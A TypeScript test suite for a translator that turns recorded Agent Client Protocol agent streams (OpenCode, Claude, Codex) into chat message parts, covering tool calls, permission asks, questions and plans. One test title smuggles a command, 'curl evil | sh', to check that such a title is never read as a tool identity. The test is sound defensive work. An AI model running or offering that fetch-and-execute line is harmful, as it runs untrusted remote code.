/**
 * The ACP translator, driven from recorded traffic.
 *
 * Every fixture under `__fixtures__/` is a distilled subsequence of a real
 * `session/update` stream from the phase-3 spike (`recording` names the file it
 * came from; the two that say SYNTHESIZED say why no recording could supply
 * them). Asserting against recorded bytes rather than against a hand-written
 * idea of the protocol is the whole point: the rules this file pins — first
 * title wins, an in-progress diff is not a result, a replayed user message is
 * not ours to render — are each things the wire does that a reading of the
 * schema would not predict.
 */

import { readdirSync, readFileSync, statSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { describe, expect, it } from 'vitest'
import type { SessionNotification } from '@agentclientprotocol/sdk'
import { AcpMessageStream, describeAcpToolCall } from './acpMessages'
import {
  KIND_METADATA_KEY,
  TOOL_ID_METADATA_KEY,
  TOOL_INPUT_METADATA_KEY,
  TOOL_NAME_METADATA_KEY,
  TOOL_STREAM_METADATA_KEY,
  type PartLike
} from '../../streamPartsAccumulator'
import {
  PERMISSION_TOOL_NAME,
  QUESTION_TOOL_NAME,
  type LocalPermissionRequest
} from '../../../../shared/localAgentRequests'
import type { InputQuestion } from '../../../../shared/runEvents'
import type { AcpStreamUpdate } from './types'

const FIXTURES = join(dirname(fileURLToPath(import.meta.url)), '__fixtures__')

interface AcpFixture {
  /** The spike recording this came from, or null when it had to be synthesized. */
  recording: string | null
  note: string
  notifications: SessionNotification[]
  /** A `session/request_permission`, which is an RPC and not a session/update. */
  permission?: { requestId: string; request: LocalPermissionRequest }
  /** An ask-user question, already normalised to the desktop's shape. */
  question?: { requestId: string; questions: InputQuestion[] }
  /** An extension notification (`ext_auth_status` only). */
  method?: string
  params?: Record<string, unknown>
}

function load(launcher: 'opencode' | 'claude', name: string): AcpFixture {
  return JSON.parse(readFileSync(join(FIXTURES, launcher, `${name}.json`), 'utf8')) as AcpFixture
}

/** Every fixture file on disk, so the hygiene test cannot be out of date. */
function fixtureFiles(): string[] {
  const out: string[] = []
  const walk = (dir: string): void => {
    for (const entry of readdirSync(dir)) {
      const path = join(dir, entry)
      if (statSync(path).isDirectory()) walk(path)
      else out.push(path)
    }
  }
  walk(FIXTURES)
  return out
}

/**
 * Fold a whole fixture in and keep the latest message for each id.
 *
 * The parts array a fold returns is the translator's own, so the map ends up
 * holding the final state of every message the stream produced — which is what
 * the accumulator would have ingested.
 */
function foldAll(
  stream: AcpMessageStream,
  fixture: AcpFixture
): { updates: AcpStreamUpdate[]; messages: Map<string, PartLike[]> } {
  const updates: AcpStreamUpdate[] = []
  const messages = new Map<string, PartLike[]>()
  for (const notification of fixture.notifications) {
    const update = stream.apply(notification)
    updates.push(update)
    if (update.message) messages.set(update.message.messageId, update.message.parts)
  }
  return { updates, messages }
}

const kindOf = (part: PartLike): unknown => part.metadata?.[KIND_METADATA_KEY]
const toolNameOf = (part: PartLike): unknown => part.metadata?.[TOOL_NAME_METADATA_KEY]
const toolIdOf = (part: PartLike): unknown => part.metadata?.[TOOL_ID_METADATA_KEY]

/** The one message a fixture produced, when it produced exactly one. */
function onlyMessage(messages: Map<string, PartLike[]>): PartLike[] {
  expect(messages.size).toBe(1)
  return [...messages.values()][0]
}

function chunk(messageId: string, text: string, kind = 'agent_message_chunk'): SessionNotification {
  return {
    sessionId: 'ses_test',
    update: { sessionUpdate: kind, messageId, content: { type: 'text', text } }
  } as unknown as SessionNotification
}

describe('fixture hygiene', () => {
  /**
   * The Claude adapter puts the user's account email in `_auth/status_update`
   * after every `session/new`, so it is in the raw recordings and one careless
   * copy would commit it. This test is the gate, and it scans the files on disk
   * rather than the ones the suite happens to load.
   */
  it('no fixture contains an email address', () => {
    const email = /[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/
    const offenders = fixtureFiles().filter((path) => email.test(readFileSync(path, 'utf8')))
    expect(offenders).toEqual([])
  })

  it('every fixture names its recording or says why it has none', () => {
    for (const path of fixtureFiles()) {
      const fixture = JSON.parse(readFileSync(path, 'utf8')) as AcpFixture
      expect(fixture.note.length, path).toBeGreaterThan(0)
      if (fixture.recording === null) expect(fixture.note, path).toContain('SYNTHESIZED')
      else expect(fixture.recording, path).toMatch(/\.ndjson$/)
    }
  })
})

describe('OpenCode', () => {
  it('accumulates a plain turn into a thinking part and a text part', () => {
    const stream = new AcpMessageStream({ launcher: 'opencode' })
    const { updates, messages } = foldAll(stream, load('opencode', 'text_turn'))
    const parts = onlyMessage(messages)
    expect(parts.map(kindOf)).toEqual(['thinking', 'text'])
    expect(parts[0].text).toBe('The user wants me to say hello in five words or fewer.')
    expect(parts[1].text).toBe('Hello there, how are you?')
    // The trailing usage_update has nowhere to go and says so.
    expect(updates[updates.length - 1]).toEqual({})
  })

  it('hands back the cumulative text, never a delta', () => {
    const stream = new AcpMessageStream()
    const seen: string[] = []
    for (const text of ['one ', 'two ', 'three']) {
      const update = stream.apply(chunk('msg_1', text))
      seen.push(update.message?.parts[0].text ?? '')
    }
    // Each fold is a prefix of the next: what the accumulator slices off is
    // exactly the chunk that arrived, and nothing is repeated.
    expect(seen).toEqual(['one ', 'one two ', 'one two three'])
  })

  it('keeps the first title as the tool name and pairs the result to the call', () => {
    const stream = new AcpMessageStream({ launcher: 'opencode' })
    const { messages } = foldAll(stream, load('opencode', 'tool_call_write'))
    const call = [...messages.values()].flat().find((p) => kindOf(p) === 'tool')
    expect(call).toBeDefined()
    // The completed update retitles the same call "private/tmp/…/notes.txt".
    expect(toolNameOf(call!)).toBe('write')
    expect(stream.toolName('call_h5kx0vip')).toBe('write')
    expect(call!.text).toBe('write: /private/tmp/spike-acp-opencode/agent1/notes.txt')
    expect(call!.metadata?.[TOOL_INPUT_METADATA_KEY]).toEqual({
      content: 'hello from spike',
      filePath: '/private/tmp/spike-acp-opencode/agent1/notes.txt'
    })

    const result = [...messages.values()].flat().find((p) => kindOf(p) === 'tool_result')
    expect(result?.text).toBe('Wrote file successfully.')
    expect(toolIdOf(result!)).toBe('call_h5kx0vip')
    expect(result?.metadata?.[TOOL_STREAM_METADATA_KEY]).toBe('stdout')
  })

  it('starts a new text part after a tool call, inside one message', () => {
    // No recording forces this — both launchers open a new messageId after a
    // call — so it is pinned on a stream that does what the protocol allows.
    const stream = new AcpMessageStream()
    stream.apply(chunk('msg_1', 'before'))
    stream.apply({
      sessionId: 'ses_test',
      update: { sessionUpdate: 'tool_call', toolCallId: 'call_1', title: 'bash', kind: 'execute' }
    } as unknown as SessionNotification)
    const last = stream.apply(chunk('msg_1', 'after'))
    const parts = last.message?.parts ?? []
    expect(parts.map(kindOf)).toEqual(['text', 'tool', 'text'])
    expect(parts[0].text).toBe('before')
    expect(parts[2].text).toBe('after')
  })

  it('does not append the reply after an MCP call to the text before it', () => {
    const stream = new AcpMessageStream({ launcher: 'opencode' })
    const { messages } = foldAll(stream, load('opencode', 'mcp_tool_call'))
    const before = messages.get('msg_08c78e051001btKZEADG79w2OI')
    const after = messages.get('msg_08c79732c001TZeHenuTZp3Eso')
    expect(before?.map(kindOf)).toEqual(['text', 'tool', 'tool_result'])
    expect(before?.[0].text).toBe('write`\n\n')
    expect(toolNameOf(before![1])).toBe('spike-mcp_secret_number')
    expect(before?.[2].text).toBe('The secret number for ada is 424242.')
    expect(after?.map(kindOf)).toEqual(['thinking', 'text'])
    expect(after?.[1].text).toBe('PINEAPPLE')
  })

  it('files a permission ask beside the call that raised it, and its decision beside the ask', () => {
    const fixture = load('opencode', 'permission_bash')
    const stream = new AcpMessageStream({ launcher: 'opencode' })
    const { messages } = foldAll(stream, fixture)
    const { requestId, request } = fixture.permission!

    const asked = stream.askPermission(requestId, request)
    expect(asked.message?.parts).toBe(messages.get('anon:acp'))
    const ask = asked.message!.parts.find((p) => toolNameOf(p) === PERMISSION_TOOL_NAME)
    expect(ask?.text).toBe('Permission needed to run a command: echo spike > bash_out.txt')
    expect(toolIdOf(ask!)).toBe('per_1')
    expect(ask?.metadata?.[TOOL_INPUT_METADATA_KEY]).toEqual(request)

    const settled = stream.settlePermission(requestId, 'Denied.')
    const decision = settled.message!.parts.find(
      (p) => kindOf(p) === 'tool_result' && toolIdOf(p) === 'per_1'
    )
    expect(decision?.text).toBe('Denied.')
    expect(decision?.metadata?.[TOOL_STREAM_METADATA_KEY]).toBe('stdout')

    // The engine's own record of the refusal is a failed tool, so stderr.
    const failure = settled.message!.parts.find(
      (p) => kindOf(p) === 'tool_result' && toolIdOf(p) === 'call_dv44kkcu'
    )
    expect(failure?.text).toBe('The user rejected permission to use this specific tool call.')
    expect(failure?.metadata?.[TOOL_STREAM_METADATA_KEY]).toBe('stderr')
  })

  it('writes a question under the reserved tool name and pairs the answer', () => {
    const fixture = load('opencode', 'question_tool')
    const stream = new AcpMessageStream({ launcher: 'opencode' })
    foldAll(stream, fixture)
    const { requestId, questions } = fixture.question!

    const asked = stream.askQuestion(requestId, questions)
    const part = asked.message!.parts.find((p) => toolNameOf(p) === QUESTION_TOOL_NAME)
    expect(part?.text).toBe('Asked a question.')
    expect(toolIdOf(part!)).toBe('que_1')
    expect(part?.metadata?.[TOOL_INPUT_METADATA_KEY]).toEqual({
      questions: [
        {
          question: 'Which color do you prefer?',
          header: 'Color Preference',
          multiSelect: false,
          options: [
            { label: 'Red', description: 'The color red' },
            { label: 'Blue', description: 'The color blue' }
          ]
        }
      ]
    })

    const settled = stream.settleQuestion(requestId, 'Answered: Red')
    const answer = settled.message!.parts.find(
      (p) => kindOf(p) === 'tool_result' && toolIdOf(p) === 'que_1'
    )
    expect(answer?.text).toBe('Answered: Red')
  })



  it('reports a mode change', () => {
    const { updates } = foldAll(new AcpMessageStream(), load('opencode', 'mode_update'))
    expect(updates[0]).toEqual({ modeId: 'folder-pineapple' })
  })

  it('renders a plan as a notice, once per distinct plan', () => {
    const fixture = load('opencode', 'plan')
    const stream = new AcpMessageStream()
    const { updates, messages } = foldAll(stream, fixture)
    const parts = onlyMessage(messages)
    expect(parts.map(kindOf)).toEqual(['notice', 'notice'])
    expect(parts[0].text).toBe(
      'Plan:\n- [x] Read the folder config\n- [~] Write notes.txt\n- [ ] Report back'
    )
    expect(parts[1].text).toContain('- [x] Write notes.txt')
    expect(updates).toHaveLength(2)
    // A plan restated without moving adds nothing: the accumulator can only
    // append, so a plan cannot rewrite its own block.
    expect(stream.apply(fixture.notifications[1])).toEqual({})
  })
})

describe('Claude', () => {
  it('accumulates the reply and ignores unsupported session metadata', () => {
    const stream = new AcpMessageStream({ launcher: 'claude' })
    const { updates, messages } = foldAll(stream, load('claude', 'text_turn'))
    const parts = onlyMessage(messages)
    expect(parts.map(kindOf)).toEqual(['text'])
    expect(parts[0].text).toBe('Secret word: pomegranate; denied: step 4 (Edit).')
    expect(updates[updates.length - 1]).toEqual({})
  })

  it('prefers _meta.claudeCode.toolName over the title the adapter shows', () => {
    const stream = new AcpMessageStream({ launcher: 'claude' })
    const { messages } = foldAll(stream, load('claude', 'tool_name_meta'))
    const parts = onlyMessage(messages)
    // The tool_call titles itself "Terminal"; only _meta says "Bash".
    expect(toolNameOf(parts[0])).toBe('Bash')
    expect(stream.toolName('toolu_01VgZ5tf7zvrjuBH7kcfTg7e')).toBe('Bash')
    expect(parts[0].text).toBe('Bash: echo hello > bash.txt')
    expect(parts[1].text).toBe('(Bash completed with no output)')
    expect(kindOf(parts[1])).toBe('tool_result')
  })

  it('keeps an MCP tool call under its full mcp__ name', () => {
    const stream = new AcpMessageStream({ launcher: 'claude' })
    const { updates, messages } = foldAll(stream, load('claude', 'mcp_tool_call'))
    const parts = onlyMessage(messages)
    expect(toolNameOf(parts[0])).toBe('mcp__cinna-spike__spike_secret_word')
    expect(parts[1].text).toBe('pomegranate')
    // The bare `_meta.claudeCode.toolResponse` update carries no status and no
    // new input, so it changes nothing.
    expect(updates[2]).toEqual({})
  })

  it('does not read an in-progress diff as the tool output', () => {
    const stream = new AcpMessageStream({ launcher: 'claude' })
    const { messages } = foldAll(stream, load('claude', 'tool_call_write'))
    const parts = onlyMessage(messages)
    expect(parts.map(kindOf)).toEqual(['tool', 'tool_result'])
    expect(parts[0].text).toBe('Write: /private/tmp/spike-acp-claude/s2/note.txt')
    expect(parts[1].text).toContain('File created successfully at:')
    expect(parts[1].text).not.toContain('[diff]')
  })

  it('files the ask beside its Edit call and the refusal beside both', () => {
    const fixture = load('claude', 'permission_edit')
    const stream = new AcpMessageStream({ launcher: 'claude' })
    foldAll(stream, fixture)
    const { requestId, request } = fixture.permission!

    const asked = stream.askPermission(requestId, request)
    const ask = asked.message!.parts.find((p) => toolNameOf(p) === PERMISSION_TOOL_NAME)
    expect(ask?.text).toBe(
      'Permission needed to edit a file: /private/tmp/spike-acp-claude/s2/note.txt'
    )
    // Beside the call, not in a message of its own.
    expect(asked.message!.parts[0].metadata?.[TOOL_ID_METADATA_KEY]).toBe(
      'toolu_01CZ5yipLiU8Ab27KimFxZdW'
    )
    const refusal = asked.message!.parts.find(
      (p) => kindOf(p) === 'tool_result' && toolIdOf(p) === 'toolu_01CZ5yipLiU8Ab27KimFxZdW'
    )
    expect(refusal?.text).toContain('User refused permission to run tool')
    expect(refusal?.metadata?.[TOOL_STREAM_METADATA_KEY]).toBe('stderr')
  })

  it('files a question beside the AskUserQuestion call it came from, and names the call', () => {
    const stream = new AcpMessageStream({ launcher: 'claude' })
    stream.apply(chunk('msg_1', 'Checking before I write.'))
    stream.apply({
      sessionId: 'ses_test',
      update: {
        sessionUpdate: 'tool_call',
        toolCallId: 'toolu_ask',
        title: 'AskUserQuestion',
        status: 'pending',
        _meta: { claudeCode: { toolName: 'AskUserQuestion' } }
      }
    } as unknown as SessionNotification)
    // The current message has moved on by the time the elicitation arrives.
    stream.apply(chunk('msg_2', 'Waiting.'))
    const questions: InputQuestion[] = [
      { question: 'Write it?', multiSelect: false, options: [{ label: 'Yes' }] }
    ]

    const asked = stream.askQuestion('que_acp_1', questions, 'toolu_ask')
    expect(asked.message?.messageId).toBe('msg_1')
    const part = asked.message!.parts.find((p) => toolNameOf(p) === QUESTION_TOOL_NAME)
    expect(part?.metadata?.[TOOL_INPUT_METADATA_KEY]).toEqual({ questions, callId: 'toolu_ask' })
    // Its answer joins it there too.
    expect(stream.settleQuestion('que_acp_1', 'Answered: Yes.').message?.messageId).toBe('msg_1')
  })

  it('drops the replayed user message without letting it own the tool calls', () => {
    const { updates, messages } = foldAll(
      new AcpMessageStream({ launcher: 'claude' }),
      load('claude', 'session_load_replay')
    )
    // The user chunk is the desktop's own message coming back.
    expect(updates[0]).toEqual({})
    expect(messages.has('f22e4b6b-8604-4ed6-8298-0e877df0b9e6')).toBe(false)

    const replayed = messages.get('anon:acp') ?? []
    expect(replayed.map(toolNameOf).filter(Boolean)).toEqual([
      'ToolSearch',
      'mcp__cinna-spike__spike_secret_word',
      'Edit'
    ])
    // A replayed call carries its whole rawInput on the first `tool_call`,
    // where a live one fills it in over three updates.
    expect(replayed[0].metadata?.[TOOL_INPUT_METADATA_KEY]).toEqual({
      query: 'select:mcp__cinna-spike__spike_secret_word',
      max_results: 1
    })
    expect(replayed.filter((p) => kindOf(p) === 'tool_result')).toHaveLength(3)
    expect(messages.get('msg_011CevBwaeLrjUDYkhGk7Rws')?.[0].text).toBe(
      'Secret word: pomegranate; denied: step 4 (Edit).'
    )
  })

  it('reads the mode out of a config_option_update', () => {
    const stream = new AcpMessageStream({ launcher: 'claude' })
    const { updates } = foldAll(stream, load('claude', 'mode_update'))
    expect(updates.map((u) => u.modeId)).toEqual(['auto', 'default'])
  })



  it('swallows an extension notification whole', () => {
    const fixture = load('claude', 'ext_auth_status')
    const stream = new AcpMessageStream({ launcher: 'claude' })
    expect(stream.applyExt(fixture.method!, fixture.params!)).toEqual({})
    expect(stream.applyExt('_session/goal', { goal: 'anything' })).toEqual({})
  })
})

describe('robustness', () => {
  it('returns an empty update for anything malformed or unknown', () => {
    const stream = new AcpMessageStream()
    const junk: unknown[] = [
      undefined,
      null,
      {},
      { sessionId: 'x' },
      { sessionId: 'x', update: null },
      { sessionId: 'x', update: 'nonsense' },
      { sessionId: 'x', update: { sessionUpdate: 'a_kind_from_2027', payload: 1 } },
      { sessionId: 'x', update: { sessionUpdate: 'tool_call' } },
      { sessionId: 'x', update: { sessionUpdate: 'tool_call', toolCallId: 42 } },
      { sessionId: 'x', update: { sessionUpdate: 'plan', entries: 'nope' } },
      { sessionId: 'x', update: { sessionUpdate: 'available_commands_update' } },
      { sessionId: 'x', update: { sessionUpdate: 'session_info_update', title: null } },
      {
        sessionId: 'x',
        update: { sessionUpdate: 'config_option_update', configOptions: [{ id: 'model' }] }
      },
      {
        sessionId: 'x',
        update: { sessionUpdate: 'agent_message_chunk', content: { type: 'image', data: 'x' } }
      }
    ]
    for (const item of junk) {
      expect(stream.apply(item as SessionNotification), JSON.stringify(item)).toEqual({})
    }
  })

  it('ignores a decision for a request it never wrote', () => {
    const stream = new AcpMessageStream()
    expect(stream.settlePermission('per_missing', 'Allowed.')).toEqual({})
    expect(stream.settleQuestion('que_missing', 'Answered: yes')).toEqual({})
    expect(stream.askQuestion('que_empty', [])).toEqual({})
  })

  it('gives every note its own slot', () => {
    const stream = new AcpMessageStream()
    stream.apply(chunk('msg_1', 'hi'))
    stream.note('Starting up the agent environment…')
    const last = stream.note('Still working.')
    const notices = (last.message?.parts ?? []).filter((p) => kindOf(p) === 'notice')
    expect(notices.map((p) => p.text)).toEqual([
      'Starting up the agent environment…',
      'Still working.'
    ])
    expect(stream.note('')).toEqual({})
  })
})

describe('which Cinna tool a call is for (cinnaTool)', () => {
  const call = (launcher: 'codex' | 'claude' | 'opencode' | 'custom', update: Record<string, unknown>): AcpMessageStream => {
    const stream = new AcpMessageStream({ launcher })
    stream.apply({ sessionId: 's', update: { sessionUpdate: 'tool_call', toolCallId: 'c', status: 'pending', ...update } } as unknown as SessionNotification)
    return stream
  }

  it('reads Codex from the server/tool pair the adapter puts in rawInput', () => {
    expect(call('codex', { title: 'mcp.cinna.probe', rawInput: { server: 'cinna', tool: 'probe', arguments: {} } }).cinnaTool('c')).toBe('probe')
    // A shell call titled like one, and another server's call, are not.
    expect(call('codex', { title: 'mcp.cinna.probe', kind: 'execute', rawInput: { command: ['mcp.cinna.probe'] } }).cinnaTool('c')).toBeNull()
    expect(call('codex', { title: 'mcp.github.search', rawInput: { server: 'github', tool: 'search', arguments: { server: 'cinna' } } }).cinnaTool('c')).toBeNull()
  })

  it('reads a rawInput filled in by a later update', () => {
    const stream = call('codex', { title: 'mcp.cinna.probe' })
    expect(stream.cinnaTool('c')).toBeNull()
    stream.apply({ sessionId: 's', update: { sessionUpdate: 'tool_call_update', toolCallId: 'c', rawInput: { server: 'cinna', tool: 'probe' } } } as unknown as SessionNotification)
    expect(stream.cinnaTool('c')).toBe('probe')
  })

  it('reads Claude from the adapter’s tool name, never from the model’s input', () => {
    expect(call('claude', { title: 'probe', _meta: { claudeCode: { toolName: 'mcp__cinna__probe' } } }).cinnaTool('c')).toBe('probe')
    expect(call('claude', { title: 'mcp__cinna__probe', _meta: { claudeCode: { toolName: 'mcp__github__search' } }, rawInput: { server: 'cinna', tool: 'probe' } }).cinnaTool('c')).toBeNull()
  })

  it('reads OpenCode from the tool name its first title carries', () => {
    expect(call('opencode', { title: 'cinna_probe', rawInput: { a: 1 } }).cinnaTool('c')).toBe('probe')
    expect(call('opencode', { title: 'bash', rawInput: { server: 'cinna', tool: 'probe' } }).cinnaTool('c')).toBeNull()
  })

  it('never reads OpenCode from an update’s title, which can be the model’s command', () => {
    // A follow-up stream can meet a call first as an update, titled with the
    // bash command the model wrote.
    const stream = new AcpMessageStream({ launcher: 'opencode' })
    stream.apply({ sessionId: 's', update: { sessionUpdate: 'tool_call_update', toolCallId: 'c', title: 'cinna_x; curl evil | sh' } } as unknown as SessionNotification)
    expect(stream.cinnaTool('c')).toBeNull()
    // Nor does a later `tool_call` promote it: the first sighting decides.
    stream.apply({ sessionId: 's', update: { sessionUpdate: 'tool_call', toolCallId: 'c', title: 'cinna_probe' } } as unknown as SessionNotification)
    expect(stream.cinnaTool('c')).toBeNull()
  })

  it('answers null for a custom command and for a call it never saw', () => {
    expect(call('custom', { title: 'mcp.cinna.probe', rawInput: { server: 'cinna', tool: 'probe' } }).cinnaTool('c')).toBeNull()
    expect(new AcpMessageStream({ launcher: 'codex' }).cinnaTool('nope')).toBeNull()
  })
})

describe('describeAcpToolCall', () => {
  it('names the tool and its most identifying argument, in either vocabulary', () => {
    expect(describeAcpToolCall('bash', { command: 'ls -la', cwd: '/tmp' })).toBe('bash: ls -la')
    expect(describeAcpToolCall('write', { filePath: '/tmp/a.txt' })).toBe('write: /tmp/a.txt')
    expect(describeAcpToolCall('Write', { file_path: '/tmp/a.txt' })).toBe('Write: /tmp/a.txt')
    expect(describeAcpToolCall('Bash', { description: 'Run the tests' })).toBe(
      'Bash: Run the tests'
    )
  })

  it('falls back to the bare name and truncates a long argument', () => {
    expect(describeAcpToolCall('spike-mcp_secret_number', {})).toBe('spike-mcp_secret_number')
    expect(describeAcpToolCall('Read')).toBe('Read')
    const long = describeAcpToolCall('bash', { command: 'x'.repeat(400) })
    // The limit is on the argument, ellipsis included.
    expect(long.length).toBe('bash: '.length + 160)
    expect(long.endsWith('…')).toBe(true)
  })
})
